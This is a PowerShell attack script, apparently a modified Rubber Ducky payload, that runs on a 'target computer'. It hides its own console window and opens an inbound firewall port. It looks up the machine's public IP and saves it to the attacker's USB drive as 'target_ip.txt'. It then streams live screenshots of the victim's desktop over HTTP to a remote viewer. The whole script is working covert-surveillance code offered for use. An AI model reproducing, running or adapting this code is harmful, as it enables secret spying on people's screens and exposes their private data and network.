<#  
================================================= Beigeworm's Screen Stream over HTTP (Modified for Public IP Capture) ==========================================================  
SYNOPSIS  
Start up a HTTP server and stream the desktop to a browser window on another device on the network. Captures PUBLIC IP and saves to USB drive.  
USAGE  
1. Run this script on target computer.  
2. Script saves public IP to file "target_ip.txt" on the USB drive (Rubber Ducky).  
3. On another device, enter http://[PUBLIC_IP]:[PORT] in a browser (if port forwarded) or use local IP if on same LAN.  
4. Hold escape key on target for 5 seconds to exit screenshare.  
#>

# Hide the powershell console (1 = yes)  
$hide = 1  
[Console]::BackgroundColor = "Black"  
Clear-Host  
[Console]::SetWindowSize(88,30)  
[Console]::Title = "HTTP Screenshare - Public IP Capture"  
Add-Type -AssemblyName System.Windows.Forms  
Add-Type -AssemblyName PresentationCore,PresentationFramework  
Add-Type -AssemblyName System.Windows.Forms  
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define port number  
if ($port.length -lt 1){  
    Write-Host "Using default port.. (8080)" -ForegroundColor Green  
    $port = 8080  
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray  
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }  
$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -match 'Wi*' -or $_.Name -match 'Eth*'}  
$primaryInterface = $filteredInterfaces | Select-Object -First 1

if ($primaryInterface) {  
    if ($primaryInterface.Name -match 'Wi*') {  
        Write-Output "Wi-Fi is the primary internet connection."  
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress  
    } elseif ($primaryInterface.Name -match 'Eth*') {  
        Write-Output "Ethernet is the primary internet connection."  
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress  
    } else {  
        Write-Output "Unknown primary internet connection."  
    }  
} else {Write-Output "No primary internet connection found."}

# --- GET PUBLIC IP AND SAVE TO USB DRIVE ---  
Write-Host "Fetching public IP address..." -ForegroundColor Yellow  
try {  
    $publicIP = (Invoke-WebRequest -Uri "http://api.ipify.org" -UseBasicParsing).Content  
    Write-Host "Public IP detected: $publicIP" -ForegroundColor Green

    # Save to USB storage (Rubber Ducky drive)  
    $usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1  
    if ($usbDrive) {  
        $filePath = "$($usbDrive.DeviceID)\target_ip.txt"  
        $publicIP | Out-File -FilePath $filePath  
        Write-Host "Public IP saved to USB drive: $filePath" -ForegroundColor Cyan  
    } else {  
        Write-Host "USB drive not found. Saving to desktop instead." -ForegroundColor Red  
        $filePath = "$env:USERPROFILE\Desktop\target_ip.txt"  
        $publicIP | Out-File -FilePath $filePath  
    }  
} catch {  
    Write-Host "Failed to retrieve public IP. Error: $_" -ForegroundColor Red  
    $publicIP = "Unknown"  
}

# --- FIREWALL RULE AND SERVER SETUP ---  
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null  
$webServer = New-Object System.Net.HttpListener  
$webServer.Prefixes.Add("http://"+$localIP+":$port/")  
$webServer.Prefixes.Add("http://localhost:$port/")  
$webServer.Start()

Write-Host ("Local Network Devices Can Reach the server at : http://"+$localIP+":$port") -ForegroundColor Green  
Write-Host ("PUBLIC IP (for remote access if port forwarded): $publicIP") -ForegroundColor Magenta  
Write-Host "Press escape key for 5 seconds to exit" -ForegroundColor Cyan  
Write-Host "Hiding this window.." -ForegroundColor Yellow

sleep 4

# Code to hide the console on Windows 10 and 11  
if ($hide -eq 1){  
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'  
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru  
    $hwnd = (Get-Process -PID $pid).MainWindowHandle  
    if ($hwnd -ne [System.IntPtr]::Zero) {  
        $Type::ShowWindowAsync($hwnd, 0)  
    }  
    else {  
        $Host.UI.RawUI.WindowTitle = 'hideme'  
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })  
        $hwnd = $Proc.MainWindowHandle  
        $Type::ShowWindowAsync($hwnd, 0)  
    }  
}

# Escape to exit key detection  
Add-Type @"  
using System;  
using System.Runtime.InteropServices;  
public class Keyboard  
{  
    [DllImport("user32.dll")]  
    public static extern short GetAsyncKeyState(int vKey);  
}  
"@

$VK_ESCAPE = 0x1B  
$startTime = $null

while ($true) {  
    try {  
        $context = $webServer.GetContext()  
        $response = $context.Response  
          
        if ($context.Request.RawUrl -eq "/stream") {  
            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"  
            $response.Headers.Add("Cache-Control", "no-cache")  
            $boundary = "--frame"  
              
            while ($context.Response.OutputStream.CanWrite) {  
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen  
                $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height  
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)  
                $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)  
                  
                $stream = New-Object System.IO.MemoryStream  
                $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)  
                $bitmap.Dispose()  
                $graphics.Dispose()  
                  
                $bytes = $stream.ToArray()  
                $stream.Dispose()  
                  
                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")  
                $response.OutputStream.Write($writer, 0, $writer.Length)  
                $response.OutputStream.Write($bytes, 0, $bytes.Length)  
                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")  
                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)  
                  
                Start-Sleep -Milliseconds 33

                # Check for the escape key press to exit  
                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0  
                if ($isEscapePressed) {  
                    if (-not $startTime) {  
                        $startTime = Get-Date  
                    }  
                    $elapsedTime = (Get-Date) - $startTime  
                    if ($elapsedTime.TotalSeconds -ge 5) {  
                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)  
                        sleep 1  
                        exit  
                    }  
                } else {  
                    $startTime = $null  
                }  
            }  
        } else {  
            $response.ContentType = "text/html"  
            $html = @"  
<!DOCTYPE html>  
<html>  
<head>  
    <title>Streaming Video</title>  
</head>  
<body>  
    <img src="/stream" />  
</body>  
</html>  
"@  
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)  
            $response.OutputStream.Write($buffer, 0, $buffer.Length)  
        }  
        $response.Close()  
    } catch {  
        Write-Host "Error encountered: $_"  
    }  
}

$webServer.Stop()